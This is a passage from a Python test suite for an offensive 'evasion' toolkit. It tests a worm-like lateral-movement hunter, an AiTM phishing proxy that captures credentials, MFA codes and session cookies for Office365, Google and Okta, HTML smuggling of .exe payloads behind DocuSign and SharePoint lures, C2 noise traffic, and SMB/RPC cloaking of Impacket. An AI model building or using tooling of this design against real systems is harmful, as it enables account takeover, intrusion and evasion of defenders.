        result = hijacker.forward_to_c2(evt)
        assert result.success is True
        assert result.event_id != ""

    def test_process_request_pipeline(self):
        from evasion.web_logic_hijacker import WebLogicHijacker

        hijacker = WebLogicHijacker(offline=True)
        body = b"user=test&pass=test123"
        events, results = hijacker.process_request(body, url="/login", method="POST", auto_forward=True)
        assert len(events) == 1
        assert len(results) == 1
        assert results[0].success is True

    def test_build_intercepted_request(self):
        from evasion.web_logic_hijacker import WebLogicHijacker, FCGI

        hijacker = WebLogicHijacker()
        req = hijacker.build_intercepted_request(b"foo=bar")
        assert req[0] == FCGI.VERSION_1
        assert FCGI.BEGIN_REQUEST in req

    def test_report_counts(self):
        from evasion.web_logic_hijacker import WebLogicHijacker

        hijacker = WebLogicHijacker(offline=True)
        hijacker.process_request(b"user=a&pass=b", url="/login")
        hijacker.process_request(b"search=cats", url="/search")
        report = hijacker.report()
        assert report["requests"] == 2
        assert report["intercepted"] == 1
        assert report["forwarded"] == 1


class TestK8sKrakenV3:
    """Test K8s Kraken v3 C2 Traffic Injection noise generator"""

    def test_import(self):
        from evasion.k8s_kraken_v3 import C2NoiseGenerator, K8sKrakenV3
        assert C2NoiseGenerator is not None
        assert K8sKrakenV3 is C2NoiseGenerator

    def test_generate_http_get(self):
        from evasion.k8s_kraken_v3 import C2NoiseGenerator

        gen = C2NoiseGenerator()
        evt = gen.generate_http_get()
        assert evt.kind.value == "http_get"
        assert b"HTTP/1.1" in evt.raw
        assert evt.size > 0

    def test_generate_http_post_contains_payload(self):
        from evasion.k8s_kraken_v3 import C2NoiseGenerator

        gen = C2NoiseGenerator()
        evt = gen.generate_http_post()
        assert evt.kind.value == "http_post"
        assert b"HTTP/1.1" in evt.raw
        assert b'"status":"ok"' in evt.raw

    def test_generate_dns_txt_query(self):
        from evasion.k8s_kraken_v3 import C2NoiseGenerator

        gen = C2NoiseGenerator()
        evt = gen.generate_dns_txt()
        assert evt.kind.value == "dns_txt"
        assert evt.size > 0

    def test_generate_tls_heartbeat(self):
        from evasion.k8s_kraken_v3 import C2NoiseGenerator

        gen = C2NoiseGenerator()
        evt = gen.generate_tls_heartbeat()
        assert evt.kind.value == "tls_heartbeat"
        assert evt.raw[:2] == b"\x16\x03"

    def test_generate_batch_default_mix(self):
        from evasion.k8s_kraken_v3 import C2NoiseGenerator

        gen = C2NoiseGenerator()
        plan = gen.generate_batch(count=20)
        assert len(plan.events) == 20
        assert plan.total_bytes > 0
        kinds = {e.kind.value for e in plan.events}
        assert "http_get" in kinds
        assert "http_post" in kinds

    def test_generate_batch_custom_mix(self):
        from evasion.k8s_kraken_v3 import C2NoiseGenerator, TrafficKind

        gen = C2NoiseGenerator()
        plan = gen.generate_batch(count=10, mix={TrafficKind.HTTP_POST: 1.0})
        assert len(plan.events) == 10
        assert all(e.kind == TrafficKind.HTTP_POST for e in plan.events)

    def test_generate_schedule_interleaves(self):
        from evasion.k8s_kraken_v3 import C2NoiseGenerator

        gen = C2NoiseGenerator()
        plan = gen.generate_batch(count=5)
        schedule = gen.generate_schedule(plan, real_traffic_interval=1.0)
        assert len(schedule) >= 5
        # Timestamps must be monotonically increasing
        times = [t for t, _ in schedule]
        assert times == sorted(times)

    def test_evasion_stats_shape(self):
        from evasion.k8s_kraken_v3 import C2NoiseGenerator

        gen = C2NoiseGenerator()
        plan = gen.generate_batch(count=15)
        stats = gen.generate_evasion_stats(plan)
        assert stats["event_count"] == 15
        assert stats["avg_size"] > 0
        assert stats["blend_ratio"] > 0

    def test_to_raw_stream(self):
        from evasion.k8s_kraken_v3 import C2NoiseGenerator

        gen = C2NoiseGenerator()
        plan = gen.generate_batch(count=3)
        stream = gen.to_raw_stream(plan)
        assert len(stream) == plan.total_bytes
        assert b"HTTP/1.1" in stream


class TestAutoReporter:
    """Test Automated Red Team Assessment Report generator"""

    def test_import(self):
        from evasion.auto_reporting import AutoReporter, AutoReportGenerator, OperationPackage
        assert AutoReporter is not None
        assert AutoReportGenerator is AutoReporter

    def test_operation_package_add_lateral(self):
        from evasion.auto_reporting import OperationPackage

        pkg = OperationPackage(scan_id="test-1", target_domain="corp.local")
        pkg.add_lateral_result("DC01", "psexec", "ADMIN\\svc", success=True)
        assert len(pkg.lateral_results) == 1
        assert pkg.lateral_results[0].target == "DC01"
        assert pkg.lateral_results[0].success is True

    def test_operation_package_add_credential(self):
        from evasion.auto_reporting import OperationPackage

        pkg = OperationPackage(scan_id="test-1")
        pkg.add_credential("admin", "P@ss", domain="CORP", cred_type="nt_hash")
        assert len(pkg.credentials) == 1
        assert pkg.credentials[0].cred_type == "nt_hash"

    def test_operation_package_add_web_hijack(self):
        from evasion.auto_reporting import OperationPackage

        pkg = OperationPackage(scan_id="test-1")
        pkg.add_web_hijack_event("login", "https://mail.corp.local", {"user": "admin", "pass": "x"})
        assert len(pkg.web_hijack_events) == 1
        assert pkg.web_hijack_events[0].event_type == "login"

    def test_operation_package_add_c2_event(self):
        from evasion.auto_reporting import OperationPackage

        pkg = OperationPackage(scan_id="test-1")
        pkg.add_c2_event("beacon-1", "10.0.0.5", "checkin", evasion_score=92.0)
        assert len(pkg.c2_events) == 1
        assert pkg.c2_events[0].evasion_score == 92.0

    def test_operation_package_add_note(self):
        from evasion.auto_reporting import OperationPackage

        pkg = OperationPackage(scan_id="test-1")
        pkg.add_note("DC compromised", severity="high", mitre_technique="T1078")
        assert len(pkg.operator_notes) == 1
        assert pkg.operator_notes[0].severity == "high"

    def test_auto_reporter_generate_markdown_summary(self):
        from evasion.auto_reporting import AutoReporter, OperationPackage

        reporter = AutoReporter(offline=True)
        pkg = OperationPackage(scan_id="test-md", target_domain="corp.local", campaign="Ghost")
        pkg.add_lateral_result("DC01", "psexec", "ADMIN\\svc", success=True, evasion_score=90.0)
        pkg.add_credential("admin", "hash", domain="CORP", cred_type="nt_hash")
        md = reporter.generate_markdown_summary(pkg)
        assert "# Red Team Assessment Summary" in md
        assert "corp.local" in md
        assert "Ghost" in md

    def test_auto_reporter_generate_full_report(self):
        from evasion.auto_reporting import AutoReporter, OperationPackage

        reporter = AutoReporter(offline=True, output_dir="/tmp/autoreport_test")
        pkg = OperationPackage(
            scan_id="test-full",
            operator="Therso",
            target_domain="corp.local",
            campaign="Ghost Protocol",
        )
        pkg.add_lateral_result("DC01", "psexec", "ADMIN\\svc", success=True, evasion_score=88.0)
        pkg.add_credential("admin", "P@ss", domain="CORP", cred_type="password")
        pkg.add_web_hijack_event("login", "https://mail.corp.local", {"user": "admin"})
        pkg.add_c2_event("b-1", "10.0.0.5", "checkin", evasion_score=90.0)

        result = reporter.generate(pkg, format="html")
        assert result.success is True
        assert result.html_path != ""

    def test_auto_reporter_chain_stats(self):
        from evasion.auto_reporting import AutoReporter, OperationPackage

        reporter = AutoReporter(offline=True)
        pkg = OperationPackage(scan_id="test-stats")
        pkg.add_lateral_result("T1", "smbexec", "u1", success=True)
        pkg.add_lateral_result("T2", "psexec", "u2", success=False)
        pkg.add_credential("u3", "p3", domain="D")

        chain = reporter._build_chain_log(pkg)
        assert len(chain.entries) == 3
        assert chain.overall_success is True
        assert chain.total_evasion_score > 0

    def test_credential_vault_roundtrip(self):
        from evasion.autonomous_hunter import CredentialVault, CredentialVaultEntry

        vault = CredentialVault(master_key=b"\x00" * 32)
        entry = CredentialVaultEntry(
            username="admin",
            domain="CORP",
            cred_type="nt_hash",
            secret="aad3b435b51404ee",
            is_domain_admin=True,
        )
        vault.add(entry)
        assert vault.count() == 1

        retrieved = vault.get_all()
        assert len(retrieved) == 1
        assert retrieved[0].secret == "aad3b435b51404ee"
        assert retrieved[0].is_domain_admin is True

    def test_credential_vault_mark_tested(self):
        from evasion.autonomous_hunter import CredentialVault, CredentialVaultEntry

        vault = CredentialVault(master_key=b"\x00" * 32)
        vault.add(CredentialVaultEntry(username="u", domain="D", cred_type="password", secret="x"))
        vault.mark_tested("D\\u", "host1", success=True)
        vault.mark_tested("D\\u", "host2", success=False)
        all_entries = vault.get_all()
        assert "host1" in all_entries[0].successful_hosts
        assert "host2" in all_entries[0].tested_hosts

    def test_decision_engine_rank_targets(self):
        from evasion.autonomous_hunter import AutonomousDecisionEngine, HunterTarget

        engine = AutonomousDecisionEngine()
        targets = [
            HunterTarget(hostname="WS-001", ip="10.0.0.10", open_ports=[445]),
            HunterTarget(hostname="DC01", ip="10.0.0.1", open_ports=[445, 389], is_dc=True),
        ]
        ranked = engine.rank_targets(targets)
        assert ranked[0].hostname == "DC01"

    def test_domain_scanner_offline(self):
        from evasion.autonomous_hunter import DomainScanner

        scanner = DomainScanner(domain="corp.local", offline=True)
        hosts = scanner.discover_all()
        assert len(hosts) > 0
        assert any(h.is_dc for h in hosts)


class TestAutonomousHunter:
    """Test Autonomous Hunter (worm-like lateral movement)"""

    def test_import(self):
        from evasion.autonomous_hunter import (
            AutoPivotChain, AutonomousHunter, CredentialVault,
            DomainScanner, AutonomousDecisionEngine, HunterReport,
            HunterState, HunterMode, run_autonomous_hunt,
        )
        assert AutoPivotChain is not None
        assert AutonomousHunter is AutoPivotChain

    def test_vault_initialises_with_creds(self):
        from evasion.autonomous_hunter import AutoPivotChain

        hunter = AutoPivotChain(
            scan_id="h1",
            initial_target="10.0.0.1",
            initial_credentials=[{"username": "admin", "password": "x", "domain": "CORP"}],
            offline=True,
        )
        assert hunter.vault.count() == 1

    def test_domain_scanner_finds_targets(self):
        from evasion.autonomous_hunter import AutoPivotChain

        hunter = AutoPivotChain(
            scan_id="h1",
            initial_target="10.0.0.1",
            initial_credentials=[],
            offline=True,
        )
        targets = hunter.scanner.discover_all()
        assert len(targets) > 0
        # Discovery only runs on start(); verify scanner works directly.
        assert len(hunter.scanner._discovered) == len(targets)

    def test_decision_engine_selects_dc_first(self):
        from evasion.autonomous_hunter import AutonomousDecisionEngine, HunterTarget, CredentialVault, CredentialVaultEntry

        engine = AutonomousDecisionEngine()
        targets = [
            HunterTarget(hostname="WS-001", ip="10.0.0.10", open_ports=[445]),
            HunterTarget(hostname="DC01", ip="10.0.0.1", open_ports=[445, 389], is_dc=True),
        ]
        vault = CredentialVault(master_key=b"\x00" * 32)
        vault.add(CredentialVaultEntry(username="admin", domain="CORP", cred_type="nt_hash", secret="hash", is_domain_admin=True))
        target, cred = engine.next_action(targets, vault)
        assert target is not None
        assert target.hostname == "DC01"

    def test_autonomous_hunt_runs(self):
        from evasion.autonomous_hunter import AutoPivotChain, HunterState

        hunter = AutoPivotChain(
            scan_id="h1",
            initial_target="10.0.0.1",
            initial_credentials=[{"username": "admin", "password": "x", "domain": "CORP"}],
            domain="corp.local",
            max_depth=2,
            offline=True,
        )
        hunter.start()
        report = hunter.wait(timeout=5.0)
        assert report.state in (HunterState.COMPLETE, HunterState.STOPPED)
        assert report.lateral_moves_attempted > 0

    def test_exfiltrate_credentials(self):
        from evasion.autonomous_hunter import AutoPivotChain

        hunter = AutoPivotChain(
            scan_id="h1",
            initial_target="10.0.0.1",
            initial_credentials=[{"username": "admin", "password": "x"}],
            offline=True,
        )
        hunter.start()
        hunter.wait(timeout=5.0)
        data = hunter.exfiltrate_credentials()
        assert data["total_credentials"] > 0
        assert "credentials" in data
        assert data["credentials"][0]["username"] == "admin"

    def test_generate_operation_package(self):
        from evasion.autonomous_hunter import AutoPivotChain

        hunter = AutoPivotChain(
            scan_id="h1",
            initial_target="10.0.0.1",
            initial_credentials=[{"username": "admin", "password": "x"}],
            offline=True,
        )
        hunter.start()
        hunter.wait(timeout=5.0)
        pkg = hunter.generate_operation_package()
        if pkg is not None:
            assert pkg.scan_id == "h1"
            assert len(pkg.credentials) > 0

    def test_hunter_summary(self):
        from evasion.autonomous_hunter import AutoPivotChain

        hunter = AutoPivotChain(
            scan_id="h1",
            initial_target="10.0.0.1",
            initial_credentials=[{"username": "admin", "password": "x"}],
            offline=True,
        )
        hunter.start()
        hunter.wait(timeout=5.0)
        s = hunter.summary()
        assert "Autonomous Hunt Summary" in s
        assert "h1" in s

    def test_run_autonomous_hunt_convenience(self):
        from evasion.autonomous_hunter import run_autonomous_hunt, HunterState

        hunter, report = run_autonomous_hunt(
            scan_id="conv-1",
            initial_target="10.0.0.1",
            credentials=[{"username": "admin", "password": "x"}],
            domain="corp.local",
            mode="stealth",
            max_depth=1,
            offline=True,
            wait=True,
            timeout=5.0,
        )
        assert report.state == HunterState.COMPLETE
        assert report.lateral_moves_attempted > 0

    def test_stop_hunter(self):
        from evasion.autonomous_hunter import AutoPivotChain, HunterState

        hunter = AutoPivotChain(
            scan_id="h1",
            initial_target="10.0.0.1",
            initial_credentials=[{"username": "admin", "password": "x"}],
            max_depth=100,
            offline=True,
        )
        hunter.start()
        hunter.stop()
        report = hunter.wait(timeout=5.0)
        assert report.state in (HunterState.COMPLETE, HunterState.STOPPED)


class TestAiTMProxy:
    """Test AiTM reverse proxy for session hijacking"""

    def test_import(self):
        from evasion.aitm_proxy import (
            ReverseProxyEngine, SessionHijacker, AiTMJavaScriptInjector,
            PLATFORM_CONFIGS, CapturedCredential, create_aitm_proxy,
        )
        assert ReverseProxyEngine is not None

    def test_platform_configs_exist(self):
        from evasion.aitm_proxy import PLATFORM_CONFIGS

        assert "office365" in PLATFORM_CONFIGS
        assert "google" in PLATFORM_CONFIGS
        assert "okta" in PLATFORM_CONFIGS
        assert "session_cookies" in PLATFORM_CONFIGS["office365"]

    def test_url_rewrite(self):
        from evasion.aitm_proxy import create_aitm_proxy

        proxy = create_aitm_proxy(platform="office365", phish_domain="login.office365-update.com", offline=True)
        rewritten = proxy.rewrite_url("https://login.microsoftonline.com/common/oauth2/authorize")
        assert "login.office365-update.com" in rewritten
        assert "login.microsoftonline.com" not in rewritten

    def test_url_restore(self):
        from evasion.aitm_proxy import create_aitm_proxy

        proxy = create_aitm_proxy(platform="office365", phish_domain="login.office365-update.com", offline=True)
        original = "https://login.microsoftonline.com/common/oauth2/authorize"
        rewritten = proxy.rewrite_url(original)
        restored = proxy.restore_url(rewritten)
        assert restored == original

    def test_capture_credential(self):
        from evasion.aitm_proxy import create_aitm_proxy

        proxy = create_aitm_proxy(platform="office365", offline=True)
        cred = proxy.capture_credential(
            username="admin@corp.local",
            password="P@ssw0rd!",
            mfa_code="123456",
            source_ip="10.0.0.5",
        )
        assert cred.username == "admin@corp.local"
        assert cred.mfa_code == "123456"
        assert len(proxy.captured) == 1

    def test_capture_from_request_body(self):
        from evasion.aitm_proxy import create_aitm_proxy

        proxy = create_aitm_proxy(platform="google", offline=True)
        req = {
            "body": "Email=user@gmail.com&Passwd=secret123&totp=789012",
            "source_ip": "10.0.0.9",
            "headers": {"User-Agent": "Mozilla/5.0", "Cookie": "SID=abc123"},
        }
        cred = proxy.capture_from_request(req)
        assert cred.username == "user@gmail.com"
        assert cred.password == "secret123"
        assert cred.mfa_code == "789012"
        assert cred.session_cookies.get("SID") == "abc123"

    def test_capture_from_json_body(self):
        from evasion.aitm_proxy import create_aitm_proxy

        proxy = create_aitm_proxy(platform="okta", offline=True)
        req = {
            "body": json.dumps({"username": "svc", "password": "x", "passCode": "555666"}),
            "source_ip": "10.0.0.8",
        }
        cred = proxy.capture_from_request(req)
        assert cred.username == "svc"
        assert cred.mfa_code == "555666"

    def test_generate_injection_script(self):
        from evasion.aitm_proxy import create_aitm_proxy

        proxy = create_aitm_proxy(platform="office365", offline=True)
        js = proxy.generate_injection_script()
        assert "sendBeacon" in js
        assert "/api/aitm/intercept" in js

    def test_summary(self):
        from evasion.aitm_proxy import create_aitm_proxy

        proxy = create_aitm_proxy(platform="google", offline=True)
        proxy.capture_credential(username="u", password="p", mfa_code="111222")
        s = proxy.summary()
        assert "Google Workspace" in s
        assert "Captured     : 1" in s
        assert "With MFA     : 1" in s

    def test_get_captured_credentials(self):
        from evasion.aitm_proxy import create_aitm_proxy

        proxy = create_aitm_proxy(platform="okta", offline=True)
        proxy.capture_credential(username="okta_user", password="okta_pass")
        creds = proxy.get_captured_credentials()
        assert len(creds) == 1
        assert creds[0]["platform"] == "okta"

    def test_session_hijacker_replay_offline(self):
        from evasion.aitm_proxy import SessionHijacker, SessionReplayResult

        hijacker = SessionHijacker()
        result = hijacker.replay_cookies(
            cookies={"ASP.NET_SessionId": "xyz"},
            target_url="https://login.microsoftonline.com",
        )
        assert isinstance(result, SessionReplayResult)
        assert result.status_code in (200, 403, 404, 0)


class TestHTMLSmuggler:
    """Test HTML Smuggling payload delivery engine"""

    def test_import(self):
        from evasion.html_smuggler import HTMLSmuggler, SmuggleTemplate, create_html_smuggler
        assert HTMLSmuggler is not None
        assert len(SmuggleTemplate) >= 5

    def test_smuggle_generates_file(self, tmp_path):
        from evasion.html_smuggler import HTMLSmuggler, SmuggleTemplate

        payload = b"\x90\x90\x90\xeb\xfe" * 100
        smuggler = HTMLSmuggler()
        out = tmp_path / "test_smuggle.html"
        result = smuggler.smuggle(
            template=SmuggleTemplate.DOCUSIGN,
            output_path=str(out),
            filename="Report_2026.exe",
            obfuscation_level="advanced",
            extra_payload=payload,
        )
        assert result["success"] is True
        assert out.exists()
        assert result["html_size"] > 0
        assert result["sha256"] != ""

    def test_smuggle_contains_blob_js(self, tmp_path):
        from evasion.html_smuggler import HTMLSmuggler, SmuggleTemplate

        payload = b"test_payload_123"
        smuggler = HTMLSmuggler()
        out = tmp_path / "blob_test.html"
        result = smuggler.smuggle(
            template=SmuggleTemplate.SHAREPOINT,
            output_path=str(out),
            filename="SharePoint_Doc.exe",
            obfuscation_level="advanced",
            extra_payload=payload,
        )
        html = out.read_text(encoding="utf-8")
        assert "Blob" in html
        assert "createObjectURL" in html
        assert "download" in html

    def test_smuggle_no_eval_or_atob_in_plain(self, tmp_path):
        from evasion.html_smuggler import HTMLSmuggler, SmuggleTemplate

        payload = b"\x00" * 500
        smuggler = HTMLSmuggler()
        out = tmp_path / "no_eval.html"
        result = smuggler.smuggle(
            template=SmuggleTemplate.SECURE_PORTAL,
            output_path=str(out),
            obfuscation_level="paranoid",
            extra_payload=payload,
        )
        html = out.read_text(encoding="utf-8")
        assert "eval(" not in html
        assert "Function(" not in html

    def test_smuggle_from_b64(self, tmp_path):
        from evasion.html_smuggler import HTMLSmuggler, SmuggleTemplate

        smuggler = HTMLSmuggler()
        b64 = base64.b64encode(b"fake_binary_data").decode()
        out = tmp_path / "b64_test.html"
        result = smuggler.smuggle_from_b64(
            payload_b64=b64,
            template=SmuggleTemplate.GOOGLE_DRIVE,
            output_path=str(out),
            filename="GDrive_File.exe",
        )
        assert result["success"] is True
        assert out.exists()

    def test_smuggle_all_templates(self, tmp_path):
        from evasion.html_smuggler import HTMLSmuggler, SmuggleTemplate

        payload = b"\x01\x02\x03\x04" * 50
        for tmpl in SmuggleTemplate:
            smuggler = HTMLSmuggler()
            out = tmp_path / f"{tmpl.value}_smuggle.html"
            result = smuggler.smuggle(
                template=tmpl,
                output_path=str(out),
                filename=f"{tmpl.value}_file.exe",
                extra_payload=payload,
            )
            assert result["success"] is True, f"Template {tmpl} failed"
            assert tmpl.value in out.read_text(encoding="utf-8")

    def test_smuggle_without_path_raises(self):
        from evasion.html_smuggler import HTMLSmuggler

        smuggler = HTMLSmuggler(beacon_path="")
        with pytest.raises(ValueError):
            smuggler.smuggle()

    def test_smuggle_missing_beacon_raises(self):
        from evasion.html_smuggler import HTMLSmuggler

        smuggler = HTMLSmuggler(beacon_path="/nonexistent/beacon.exe")
        with pytest.raises(FileNotFoundError):
            smuggler.smuggle()

    def test_sha256_consistency(self, tmp_path):
        from evasion.html_smuggler import HTMLSmuggler, SmuggleTemplate

        payload = b"consistent_payload"
        smuggler = HTMLSmuggler()
        out = tmp_path / "hash_test.html"
        result1 = smuggler.smuggle(
            template=SmuggleTemplate.DOCUSIGN,
            output_path=str(out),
            obfuscation_level="basic",
            extra_payload=payload,
        )
        sha1 = result1["sha256"]

        out2 = tmp_path / "hash_test2.html"
        result2 = smuggler.smuggle(
            template=SmuggleTemplate.DOCUSIGN,
            output_path=str(out2),
            obfuscation_level="basic",
            extra_payload=payload,
        )
        sha2 = result2["sha256"]
        assert sha1 == sha2

    def test_javascript_injector_output(self):
        from evasion.aitm_proxy import AiTMJavaScriptInjector

        js = AiTMJavaScriptInjector.generate_session_hijack_js(
            exfil_endpoint="/api/aitm/intercept",
            capture_cookies=True,
            capture_tokens=True,
            capture_mfa=True,
        )
        assert "cookie_dump" in js
        assert "token_capture" in js
        assert "mfa_capture" in js
        assert "sendBeacon" in js

    def test_cookie_replay_script_format(self):
        from evasion.aitm_proxy import AiTMJavaScriptInjector

        cookies = {"ESTSAUTH": "abc123", "ESTSAUTHPERSISTENT": "def456"}
        script = AiTMJavaScriptInjector.generate_cookie_replay_script(cookies, "https://outlook.office365.com")
        assert "requests" in script
        assert "ESTSAUTH" in script
        assert "Cookie" in script

    def test_aitm_proxy_summary_after_capture(self):
        from evasion.aitm_proxy import create_aitm_proxy

        proxy = create_aitm_proxy(platform="office365", offline=True)
        proxy.capture_credential(username="user", password="pass", mfa_code="123456", source_ip="1.2.3.4")
        proxy.capture_credential(username="admin", password="admin123", source_ip="5.6.7.8")
        s = proxy.summary()
        assert "Captured     : 2" in s
        assert "With MFA     : 1" in s

    def test_get_mfa_tokens(self):
        from evasion.aitm_proxy import create_aitm_proxy

        proxy = create_aitm_proxy(platform="office365", offline=True)
        proxy.capture_credential(username="u", password="p", mfa_code="999888")
        proxy.capture_credential(username="u2", password="p2")
        mfas = proxy.get_mfa_tokens()
        assert len(mfas) == 1
        assert mfas[0] == "999888"


class TestSMBRPCCloaker:
    """Test SMB/RPC wire-level cloaking for Impacket lateral movement"""

    def test_import(self):
        from evasion.smb_rpc_cloaker import (
            SMBRPCCloaker, SMBFragmenter, RPCPadder, PipeNameObfuscator,
            TimingJitterInjector, ImpacketCommandWrapper, CloakReport,
            create_smb_rpc_cloaker,
        )
        assert SMBRPCCloaker is not None

    def test_fragmenter_splits_data(self):
        from evasion.smb_rpc_cloaker import SMBFragmenter

        frag = SMBFragmenter(min_fragment_size=32, max_fragment_size=64)
        data = b"A" * 200
        fragments = frag.fragment(data, max_size=50)
        assert len(fragments) > 1
        reassembled = frag.reassemble(fragments)
        assert reassembled == data

    def test_fragmenter_single_fragment(self):
        from evasion.smb_rpc_cloaker import SMBFragmenter

        frag = SMBFragmenter()
        data = b"SMALL"
        fragments = frag.fragment(data, max_size=1024)
        assert len(fragments) == 1
        assert frag.reassemble(fragments) == data

    def test_fragment_smb2_create_request(self):
        from evasion.smb_rpc_cloaker import SMBFragmenter

        frag = SMBFragmenter()
        payload = b"\x00" * 256
        fragments = frag.fragment_smb2_create_request(payload)
        assert len(fragments) > 1
        assert frag.reassemble(fragments) == payload

    def test_inject_padding(self):
        from evasion.smb_rpc_cloaker import SMBFragmenter

        frag = SMBFragmenter()
        data = b"ABCDEF"
        padded = frag.inject_padding(data, min_pad=4, max_pad=4)
        assert len(padded) > len(data)

    def test_rpc_padder_generates_benign_calls(self):
        from evasion.smb_rpc_cloaker import RPCPadder

        padder = RPCPadder()
        padding = padder.pad_rpc_call(call_id=42, real_call=b"\x05\x00\x00\x00", pre_benign=2, post_benign=1)
        assert padding.call_id == 42
        assert len(padding.pre_pad) > 0
        assert len(padding.post_pad) > 0

    def test_pipe_name_obfuscator(self):
        from evasion.smb_rpc_cloaker import PipeNameObfuscator

        obf = PipeNameObfuscator(seed=42)
        cmd = ["python3", "smbexec.py", "DOMAIN\\user:pass@target", "-pipe", r"\pipe\srvsvc"]
        new_cmd, renames = obf.obfuscate_command(cmd)
        assert len(renames) > 0
        assert r"\pipe\srvsvc" not in new_cmd[2]

    def test_pipe_name_obfuscator_restore(self):
        from evasion.smb_rpc_cloaker import PipeNameObfuscator

        obf = PipeNameObfuscator(seed=42)
        cmd = ["python3", "smbexec.py", "DOMAIN\\user:pass@target", "-pipe", r"\pipe\srvsvc"]
        new_cmd, renames = obf.obfuscate_command(cmd)
        restored = obf.restore_command(new_cmd)
        assert restored == cmd

    def test_timing_jitter_injector(self):
        from evasion.smb_rpc_cloaker import TimingJitterInjector

        jitter = TimingJitterInjector(base_delay_ms=10, jitter_ms=50)
        delays = jitter.generate_jittered_schedule(5)
        assert len(delays) == 5
        assert all(0.01 <= d <= 0.06 for d in delays)

    def test_impacket_wrapper_wraps_command(self):
        from evasion.smb_rpc_cloaker import ImpacketCommandWrapper

        wrapper = ImpacketCommandWrapper()
        cmd = ["python3", "smbexec.py", "DOMAIN\\user:pass@target"]
        cloaked, meta = wrapper.wrap(cmd, method="smbexec")
        assert len(cloaked) >= len(cmd)
        assert meta["banner_suppressed"] is True
        assert "-no-banner" in cloaked
        assert "-quiet" in cloaked

    def test_impacket_wrapper_generates_script(self):
        from evasion.smb_rpc_cloaker import ImpacketCommandWrapper

        wrapper = ImpacketCommandWrapper()
        script = wrapper.generate_wrapper_script(["python3", "smbexec.py", "..."], jitter_ms=100)
        assert "#!/bin/sh" in script
        assert "sleep" in script

    def test_smb_rpc_cloaker_basic(self):
        from evasion.smb_rpc_cloaker import create_smb_rpc_cloaker, CloakReport

        cloaker = create_smb_rpc_cloaker(offline=True)
        cmd = ["python3", "/opt/impacket/examples/smbexec.py", "DOMAIN\\user:pass@target"]
        cloaked, report = cloaker.cloak_impacket_command(cmd, method="smbexec")
        assert len(cloaked) > 0
        assert report.smb_fragments > 0
        assert report.rpc_padding > 0
        assert isinstance(report, CloakReport)

    def test_smb_rpc_cloaker_no_fragment(self):
        from evasion.smb_rpc_cloaker import create_smb_rpc_cloaker

        cloaker = create_smb_rpc_cloaker(offline=True, fragment_smb=False)
        cmd = ["python3", "wmiexec.py", "u:p@target"]
        cloaked, report = cloaker.cloak_impacket_command(cmd, method="wmiexec")
        assert report.smb_fragments == 0

    def test_generate_smb_junk_traffic(self):
        from evasion.smb_rpc_cloaker import create_smb_rpc_cloaker

        cloaker = create_smb_rpc_cloaker(offline=True)
        packets = cloaker.generate_smb_junk_traffic("10.0.0.1", count=3)
        assert len(packets) == 3
        assert all(isinstance(p, bytes) for p in packets)

    def test_cloaker_summary(self):
        from evasion.smb_rpc_cloaker import create_smb_rpc_cloaker

        cloaker = create_smb_rpc_cloaker(offline=True)
        cloaker.cloak_impacket_command(["python3", "dcomexec.py", "u:p@target"], method="dcomexec")
        s = cloaker.summary()
        assert "SMB/RPC Cloaking Summary" in s

    def test_smb_fragment_reassembly_edge_cases(self):
        from evasion.smb_rpc_cloaker import SMBFragmenter

        frag = SMBFragmenter()
        # Empty data
        fragments = frag.fragment(b"", max_size=64)
        assert len(fragments) == 1
        assert frag.reassemble(fragments) == b""

        # Exact multiple
        data = b"X" * 128
        fragments = frag.fragment(data, max_size=64)
        assert frag.reassemble(fragments) == data
